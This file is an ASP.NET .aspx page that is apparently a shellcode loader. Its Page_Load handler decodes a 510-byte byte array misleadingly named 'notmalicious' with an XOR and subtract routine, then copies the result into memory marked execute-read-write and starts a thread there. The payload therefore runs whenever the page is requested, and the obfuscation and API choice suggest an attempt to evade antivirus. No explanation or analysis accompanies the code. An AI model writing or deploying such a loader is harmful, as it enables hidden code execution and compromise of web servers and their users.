<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect, Int32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

	[System.Runtime.InteropServices.DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

    static byte[] decryptPayload(byte[] encryptedPayload)
    {
        byte[] data = new byte[encryptedPayload.Length];

        for (int i = 0; i < encryptedPayload.Length; i++)
        {
            data[i] = (byte)((encryptedPayload[i] ^ 'x'));
        }

        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(((uint)data[i] - 14) & 0xFF);
        }

        return data;
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] notmalicious = new byte [510] {
            0x72, 0x2e, 0xe9, 0x8a, 0x86, 0x8e, 0xa2, 0x76, 0x76, 0x76, 0x37, 0x27, 0x37, 0x26, 0x18,
            0x27, 0x2e, 0x47, 0x98, 0x0b, 0x2e, 0xe1, 0x18, 0x16, 0x2e, 0xe1, 0x18, 0x5e, 0x2e, 0xe1,
            0x18, 0x56, 0x1c, 0x2e, 0x65, 0xbd, 0x20, 0x20, 0x23, 0x47, 0xaf, 0x2e, 0xe1, 0xf8, 0x26,
            0x2e, 0x47, 0xb6, 0xc2, 0x32, 0x17, 0xf2, 0x68, 0x42, 0x56, 0x37, 0xb7, 0xaf, 0x63, 0x37,
            0x77, 0xb7, 0x88, 0x83, 0x18, 0x2e, 0xe1, 0x18, 0x56, 0xe1, 0x28, 0x32, 0x2e, 0x77, 0xa6,
            0x37, 0x27, 0x0c, 0xf7, 0xfe, 0x5e, 0x61, 0x68, 0x65, 0xeb, 0xf8, 0x76, 0x76, 0x76, 0xe1,
            0xf6, 0xee, 0x76, 0x76, 0x76, 0x2e, 0xeb, 0xb6, 0xfa, 0x0d, 0x2e, 0x77, 0xa6, 0xe1, 0x2e,
            0x5e, 0x26, 0x2a, 0xe1, 0x36, 0x56, 0x2f, 0x77, 0xa6, 0x89, 0x1c, 0x23, 0x47, 0xaf, 0x2e,
            0x75, 0xaf, 0x37, 0xe1, 0x3a, 0xee, 0x2e, 0x77, 0x9c, 0x2e, 0x47, 0xb6, 0xc2, 0x37, 0xb7,
            0xaf, 0x63, 0x37, 0x77, 0xb7, 0x3e, 0x96, 0xfb, 0x87, 0x22, 0x69, 0x22, 0x4a, 0x6e, 0x2b,
            0x3f, 0xa7, 0xfb, 0x9e, 0x1e, 0x2a, 0xe1, 0x36, 0x4a, 0x2f, 0x77, 0xa6, 0x0c, 0x37, 0xe1,
            0x62, 0x2e, 0x2a, 0xe1, 0x36, 0x52, 0x2f, 0x77, 0xa6, 0x37, 0xe1, 0x6a, 0xee, 0x2e, 0x77,
            0xa6, 0x37, 0x1e, 0x37, 0x1e, 0x14, 0x1f, 0x10, 0x37, 0x1e, 0x37, 0x1f, 0x37, 0x10, 0x2e,
            0xe9, 0x82, 0x56, 0x37, 0x18, 0x75, 0x96, 0x1e, 0x37, 0x1f, 0x10, 0x2e, 0xe1, 0x58, 0x8f,
            0x21, 0x75, 0x75, 0x75, 0x13, 0x2f, 0xb4, 0xfd, 0xf9, 0x38, 0x15, 0x39, 0x38, 0x76, 0x76,
            0x37, 0x1c, 0x2f, 0xef, 0x8c, 0x2e, 0xf7, 0x82, 0xd6, 0x77, 0x76, 0x76, 0x2f, 0xef, 0x8b,
            0x2f, 0xb2, 0x68, 0x76, 0x55, 0x36, 0xb6, 0xce, 0x43, 0x92, 0x37, 0x1a, 0x2f, 0xef, 0x8a,
            0x22, 0xef, 0x87, 0x37, 0xb0, 0x22, 0xfd, 0x4c, 0x6d, 0x75, 0x9b, 0x22, 0xef, 0x80, 0x0e,
            0x77, 0x77, 0x76, 0x76, 0x1f, 0x37, 0xb0, 0x4f, 0xf6, 0x01, 0x76, 0x75, 0x9b, 0x00, 0x60,
            0x37, 0x14, 0x26, 0x26, 0x23, 0x47, 0xaf, 0x23, 0x47, 0xb6, 0x2e, 0x75, 0xb6, 0x2e, 0xef,
            0xa8, 0x2e, 0x75, 0xb6, 0x2e, 0xef, 0xb7, 0x37, 0xb0, 0x80, 0x65, 0x95, 0x96, 0x75, 0x9b,
            0x2e, 0xef, 0xad, 0x00, 0x66, 0x37, 0x1e, 0x22, 0xef, 0x88, 0x2e, 0xef, 0x7f, 0x37, 0xb0,
            0xdf, 0xcb, 0xfa, 0x17, 0x75, 0x9b, 0xeb, 0xb6, 0xfa, 0x60, 0x2f, 0x75, 0xa4, 0xfb, 0x8b,
            0x8e, 0xd9, 0x76, 0x76, 0x76, 0x2e, 0xe9, 0x82, 0x66, 0x2e, 0xef, 0x88, 0x23, 0x47, 0xaf,
            0x00, 0x6a, 0x37, 0x1e, 0x2e, 0xef, 0x7f, 0x37, 0xb0, 0x68, 0x9f, 0xae, 0x15, 0x75, 0x9b,
            0xe9, 0x7e, 0x76, 0xf4, 0x1b, 0x2e, 0xe9, 0xaa, 0x56, 0x14, 0xef, 0x7c, 0x00, 0x36, 0x37,
            0x1f, 0x0e, 0x76, 0x66, 0x76, 0x76, 0x37, 0x1e, 0x2e, 0xef, 0x78, 0x2e, 0x47, 0xaf, 0x37,
            0xb0, 0x1e, 0xca, 0x19, 0x8b, 0x75, 0x9b, 0x2e, 0xef, 0xa9, 0x2f, 0xef, 0xad, 0x23, 0x47,
            0xaf, 0x2f, 0xef, 0x86, 0x2e, 0xef, 0x90, 0x2e, 0xef, 0x7f, 0x37, 0xb0, 0x68, 0x9f, 0xae,
            0x15, 0x75, 0x9b, 0xe9, 0x7e, 0x76, 0xf3, 0x4e, 0x1e, 0x37, 0x1d, 0x1f, 0x0e, 0x76, 0x36,
            0x76, 0x76, 0x37, 0x1e, 0x00, 0x76, 0x10, 0x37, 0xb0, 0x61, 0x45, 0x65, 0x46, 0x75, 0x9b,
            0x1d, 0x1f, 0x37, 0xb0, 0xfb, 0x04, 0x23, 0x17, 0x75, 0x9b, 0x2f, 0x75, 0xa4, 0x8f, 0x32,
            0x75, 0x75, 0x75, 0x2e, 0x77, 0xa9, 0x2e, 0x4f, 0xac, 0x2e, 0xeb, 0x7c, 0xfb, 0xba, 0x37,
            0x75, 0x8d, 0x1e, 0x00, 0x76, 0x1f, 0x2f, 0xad, 0xa8, 0x86, 0xbb, 0xc8, 0x1c, 0x75, 0x9b
        };

        byte[] plmasd = decryptPayload(notmalicious);

        IntPtr yLl = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,(UIntPtr)plmasd.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
        System.Runtime.InteropServices.Marshal.Copy(plmasd,0,yLl,plmasd.Length);
        IntPtr n4p = IntPtr.Zero;
        IntPtr nuoyf = CreateThread(IntPtr.Zero,UIntPtr.Zero,yLl,IntPtr.Zero,0,ref n4p);
    }
</script>
